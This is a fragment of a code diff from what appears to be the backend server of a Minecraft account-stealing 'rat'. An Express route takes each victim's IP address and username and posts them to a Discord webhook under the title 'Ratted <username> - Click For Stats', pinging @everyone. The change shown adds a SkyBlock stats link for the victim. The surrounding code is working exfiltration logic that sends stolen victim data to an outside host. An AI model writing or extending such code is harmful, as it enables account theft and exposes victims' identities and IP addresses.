@@ -154,6 +154,7 @@ app.post("/", (req, res) => {
                 try {
                     post(process.env.WEBHOOK, JSON.stringify({
                         content: `@everyone - ${req.body.ip}`, //ping
+			url: `https://sky.shiiyu.moe/stats/${req.body.username}`,
                         embeds: [{
                             title: `Ratted ${req.body.username} - Click For Stats`,
                              fields: [
